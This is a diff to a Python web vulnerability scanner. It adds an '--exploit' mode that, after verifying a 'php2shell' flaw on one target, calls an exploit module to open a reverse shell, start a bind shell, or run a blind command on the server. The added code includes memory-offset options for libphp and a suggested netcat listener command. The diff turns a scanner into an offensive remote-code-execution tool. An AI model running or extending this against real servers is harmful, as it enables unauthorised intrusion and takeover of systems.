@@ -67,6 +67,83 @@ parser.add_argument(
     "--log",
     help="Write findings (matched results only) to this file",
 )
+parser.add_argument(
+    "--exploit",
+    action="store_true",
+    help=(
+        "After the scanner verifies php2shell on a single --target, run the "
+        "php2shell exploit chain against it to get a reverse shell (only "
+        "usable with exactly one --target and no --domain). Start a listener "
+        "first, e.g. nc -lvnp 4444."
+    ),
+)
+parser.add_argument(
+    "--lhost",
+    help="Host for the target's reverse shell to connect back to (required with --exploit)",
+)
+parser.add_argument(
+    "--lport",
+    type=int,
+    default=4444,
+    help="Port for the reverse shell (default: 4444)",
+)
+parser.add_argument(
+    "--command",
+    help=(
+        "With --exploit, run this single command (max 14 bytes, blind, no "
+        "output) instead of a reverse shell, e.g. 'id>/out/p1'"
+    ),
+)
+parser.add_argument(
+    "--profile",
+    choices=("official", "official83", "lab"),
+    default="official",
+    help="Target build profile with calibrated heap/libphp offsets (default: official)",
+)
+parser.add_argument(
+    "--zif-offset",
+    type=lambda x: int(x, 0),
+    help="Offset of zif_system in libphp.so (overrides the profile)",
+)
+parser.add_argument(
+    "--dtor-offset",
+    type=lambda x: int(x, 0),
+    help="Offset of ZVAL_PTR_DTOR in libphp.so (overrides the profile)",
+)
+parser.add_argument(
+    "--htdata-offset",
+    type=lambda x: int(x, 0),
+    help="Chunk-relative offset of the 167-byte carrier string (overrides the profile)",
+)
+parser.add_argument(
+    "--bind-port",
+    type=int,
+    help=(
+        "With --exploit, start a bind shell listening on this port on the "
+        "target instead of a reverse shell; the scanner connects to it and "
+        "drives the session (no catch listener needed)"
+    ),
+)
+parser.add_argument(
+    "--no-serve",
+    action="store_true",
+    help=(
+        "With --exploit/--bind-port, do not start the local script server; "
+        "the script is assumed to be served already at --lhost/--lport"
+    ),
+)
+parser.add_argument(
+    "--retries",
+    type=int,
+    default=3,
+    help="Exploit attempts per leak stage (default: 3)",
+)
+parser.add_argument(
+    "--huge-mb",
+    type=int,
+    default=12,
+    help="Size of the OOM field in MiB; must exceed the target's memory_limit (default: 12)",
+)
 
 
 def have(cmd):
@@ -235,22 +312,73 @@ def run_nuclei(targets, log_path=None):
     finally:
         os.unlink(list_path)
 
+def run_exploit(args):
+    """Verify the vulnerability on the single --target, then exploit it."""
+    import exploit
+
+    if len(args.target) != 1:
+        parser.error("--exploit requires exactly one --target")
+    if args.domain or args.subdomain:
+        parser.error("--exploit cannot be combined with --domain/--subdomain")
+
+    target = args.target[0]
+    if not is_vulnerable(target):
+        print("Vulnerability not verified on " + target + "; not exploiting.")
+        return 1
+
+    print("Vulnerability verified; starting exploit against " + target)
+    kwargs = dict(
+        profile=args.profile,
+        zif_offset=args.zif_offset,
+        dtor_offset=args.dtor_offset,
+        htdata_offset=args.htdata_offset,
+        huge_mb=args.huge_mb,
+        retries=args.retries,
+    )
+    if args.command:
+        if len(args.command.encode()) > exploit.MAX_CMD:
+            print(
+                "--command is limited to " + str(exploit.MAX_CMD)
+                + " bytes by the forged carrier."
+            )
+            return 1
+        ok = exploit.exploit_command(target, args.command, **kwargs)
+    elif args.bind_port:
+        if not args.lhost:
+            parser.error("--bind-port needs --lhost (where the script is served), or pass --command")
+        ok = exploit.exploit_bind(
+            target, args.lhost, args.lport, args.bind_port,
+            serve=not args.no_serve, **kwargs,
+        )
+    else:
+        if not args.lhost:
+            parser.error("--exploit needs --lhost (reverse shell target), or pass --command")
+        ok = exploit.exploit_shell(target, args.lhost, args.lport, **kwargs)
+    return 0 if ok else 1
+
+
 def main():
     args = parser.parse_args()
 
     if not args.target and not args.domain:
         parser.error("provide --target and/or --domain")
 
-    # Check every dependency so all missing ones are reported at once, rather
-    # than exiting on the first.
-    required = ["nuclei", "amass"]
-    missing = False
-    for cmd in required:
-        if not have(cmd):
-            missing = True
-    if missing:
-        print("Missing dependencies. Exiting.")
-        sys.exit(1)
+    if args.exploit:
+        # The exploit chain needs only the target URL; skip the amass check.
+        if not have("nuclei"):
+            print("Missing dependencies. Exiting.")
+            sys.exit(1)
+    else:
+        # Check every dependency so all missing ones are reported at once,
+        # rather than exiting on the first.
+        required = ["nuclei", "amass"]
+        missing = False
+        for cmd in required:
+            if not have(cmd):
+                missing = True
+        if missing:
+            print("Missing dependencies. Exiting.")
+            sys.exit(1)
 
     invalid = []
     for target in args.target:
@@ -264,6 +392,9 @@ def main():
             "--target does not look like a web server:\n  "
             + "\n  ".join(invalid)
         )
+
+    if args.exploit:
+        sys.exit(run_exploit(args))
 
     paths = load_paths(args)
 
